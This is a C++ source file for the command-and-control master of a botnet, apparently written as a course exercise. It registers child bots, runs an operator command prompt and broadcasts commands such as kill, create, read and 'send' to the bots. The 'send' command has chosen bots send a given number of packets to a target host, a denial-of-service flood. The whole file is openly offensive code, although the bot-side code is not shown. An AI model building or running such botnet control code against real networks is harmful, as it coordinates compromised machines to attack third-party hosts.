#include "master-bot.h"
#include <signal.h>

void Master::command (int argc, char **argv, int src_fd){	
	if(argc == 1){
		if(strcmp(argv[0],"kill") == 0){
			broadcast("kill\n");
			alive_ = false;
			return;
		}else if(strcmp(argv[0],"show") == 0){
			res_wait_ = N_SUPER;	
			broadcast("show\n");
			return;
		}
	}

	if(argc == 2){
		if(strcmp(argv[0], "report") == 0){
			child_[atoi(argv[1])] = src_fd;
			return;	
		}
	}

	if(argc == 4){
		if(strcmp(argv[0],"res-search") == 0){
			stringstream sstm;

			res_wait_--;
			sstm << "[" << argv[1] << ":" << argv[2] << "] " << argv[3] << endl;
			cout << sstm.str();
			if(res_wait_ == 0)
				getcommand();
			return;
		}
	}

	if (argc > 1){
		if(strcmp(argv[0], "search") == 0){
			int nchild;
			stringstream sstm;
			vector<int> cmd_child;

			filterMyChild(&argv[1], argc-1, cmd_child);

			nchild = cmd_child.size();
			res_wait_ = nchild;
			if (nchild == 0){
				getcommand();
				return;
			}

			sstm << "search";
			for(int i=0; i<nchild; ++i){
				sstm << " " << cmd_child[i];
			}
			sstm << endl;
			broadcast(sstm.str().c_str());
			return;
		}else if(strcmp(argv[0], "kill") == 0){
			int nchild;
			stringstream sstm;
			vector<int> cmd_child;

			filterMyChild(&argv[1], argc-1, cmd_child);
			nchild = cmd_child.size();

			sstm << "kill ";
			for(int i=0; i<nchild; ++i)
				sstm << " " << cmd_child[i];
			sstm << endl;
			broadcast(sstm.str().c_str());
			getcommand();
			return;
		}
	}

	if(argc > 2){
		if (strcmp(argv[0],"report") == 0){
			stringstream sstm;

			res_wait_--;
			sstm << "report " <<	argv[1] << ":[";
			for(int i=2; i<argc-1; ++i)
				sstm << argv[i] << ", ";
			sstm << argv[argc-1] << "]" << endl;

			for(int i=2; i<argc; ++i){
				reg_child_[atoi(argv[i])] = atoi(argv[1]);	
			}

			cout << sstm.str();
			if (res_wait_ == 0){
				cout << "a botnet is successfully constructed!" << endl;
				getcommand ();
			}
			return;
		}else if(strcmp(argv[0],"read") == 0){
			if(strcmp(argv[1],"-date") == 0){
				int nchild;
				stringstream sstm;
				vector<int> cmd_child; 
	
				filterMyChild(&argv[2], argc-2, cmd_child);		
	
				nchild = cmd_child.size();	
				res_wait_ = nchild;
				if (nchild == 0){
					getcommand();
					return;
				}
				sstm << "read -date";
				for(int i=0; i<nchild; ++i){
					sstm << " " << cmd_child[i];
				}
				sstm << endl;
				broadcast(sstm.str().c_str());	
				return;
			}else if(strcmp(argv[1],"-host") == 0){
				int nchild;
				stringstream sstm;
				vector<int> cmd_child;

				filterMyChild(&argv[2], argc-2, cmd_child);

				nchild = cmd_child.size();
				res_wait_ = nchild;
				if (nchild == 0){
					getcommand();
					return;
				}			
				sstm << "read -host";
				for(int i=0; i<nchild; ++i){
					sstm << " " << cmd_child[i];
				}
				sstm << endl;
				broadcast(sstm.str().c_str());
				return;
			}else{
				cout << "Invalid read option: " << argv[1] << endl;
				getcommand();
				return;
			}
		}else if(strcmp(argv[0],"create") == 0){
			int nchild;
			stringstream sstm;
			vector<int> cmd_child;

			filterMyChild(&argv[2], argc-2, cmd_child);

			nchild = cmd_child.size();
			res_wait_ = nchild;
			if (nchild == 0){
				getcommand();
				return;
			}
			sstm << "create " << argv[1];
			for(int i=0; i<nchild; ++i)
				sstm << " " << cmd_child[i];
			sstm << endl;
			broadcast(sstm.str().c_str());
			return;

		}else if(strcmp(argv[0],"res-show") == 0){
			stringstream sstm;

			res_wait_--;
			sstm << argv[1] << ":[";
			for(int i=2; i<argc-1; ++i)
				sstm << argv[i] << ", ";
			sstm << argv[argc-1] << "]" << endl;
			cout << sstm.str();
			if(res_wait_ == 0)
				getcommand();
			return;
		}else if(strcmp(argv[0],"res-rd") == 0){
			stringstream sstm;
		
			res_wait_--;
			sstm << "[" << argv[1] << "] ";
			for(int i=2; i<argc-1; ++i){
				sstm << argv[i] << " ";
			}
			sstm << argv[argc-1] << endl;
			cout << sstm.str();
			if(res_wait_ == 0){
				getcommand();
			}
			return;
		}else if(strcmp(argv[0],"res-rh") == 0){
			stringstream sstm;

			res_wait_--;
			sstm << "[" << argv[1] << "] ";
			for(int i=2; i<argc-1; ++i){
				sstm << argv[i] << " ";
			}
			sstm << argv[argc-1] << endl;
			cout << sstm.str();
			if(res_wait_ == 0){
				getcommand();
			}
			return;
		}else if(strcmp(argv[0],"res-create") == 0){
			stringstream sstm;

			res_wait_--;
			sstm << "[" << argv[1] << "] ";
			if(strcmp(argv[3],"OK") == 0){
				sstm << argv[2] << " is created.";
			}else if(strcmp(argv[3],"fail") == 0){
				sstm << argv[2] << " cannot be created.";
			}else if(strcmp(argv[3], "dead") == 0){
				sstm << "dead";
			}
			sstm << endl;
			cout << sstm.str();
			if(res_wait_ == 0)
				getcommand();
			return;
		}else if(strcmp(argv[0],"res-send") == 0){
			stringstream sstm;
			int cid = atoi(argv[1]);

			res_wait_--;
			sstm << "[" << cid << "] ";
			if(strcmp(argv[2],"dead") == 0){
				sstm << "dead";
			}else{
				sstm << "send " << argv[2] << " packets to " << argv[3];
			}
			sstm << endl;
			cout << sstm.str();
			if(res_wait_ == 0)
				getcommand();
			return;
		}
	}

	if (argc > 3){
		if(strcmp(argv[0],"send") == 0){
			int nchild;
			stringstream sstm;
			vector<int> cmd_child;

			filterMyChild(&argv[3],argc-3,cmd_child);
		
			nchild = cmd_child.size();
			res_wait_ = nchild;
			if(res_wait_ == 0){
				getcommand();
				return;
			}	
	
			sstm << argv[0] << " " << argv[1] << " " << argv[2];
			for(int i=0; i<nchild; ++i)
				sstm << " " << cmd_child[i];
			sstm << endl;	
			broadcast(sstm.str().c_str());
			return;
		}
	}

	cout << "Invalid command: ";
	for(int i=0; i<argc; ++i)
		cout << argv[i] << " ";
	cout << endl;
	getcommand();

	return;
}

void Master::getcommand (){
	char buffer[1024];
	int argc;
	char **argv;
	char *new_buffer;
	int n;

	cout << "command# ";
	cin.getline(buffer,1024);

	utility::parseCmd (buffer, argc, argv);
	command (argc, argv, -1); // this command is from user.
	free(argv);
}

void Master::filterMyChild (char **argv, int n, vector<int> &vlist){
	for(int i=0; i<n; ++i){
		int chid = atoi(argv[i]);
		if(isMyChild(chid))
			vlist.push_back(chid);
		else{
			stringstream sstm;
			sstm << "[" << chid << "] Invalid child ID." << endl;
			cout << sstm.str();
		}
	}
}

bool Master::isMyChild (int id){
	for(map<int,int>::iterator it = reg_child_.begin(); it != reg_child_.end(); ++it){
		if (it->first == id)
			return true;
	}
	return false;
}

int main (int argc, char* argv[]){
	Master *master = new Master(atoi(argv[1]));
	cout << "Booting botnet...." << endl;
	// here master need to wait for supers and children.
	while(master->isAlive()) { }	
	return 0;
}
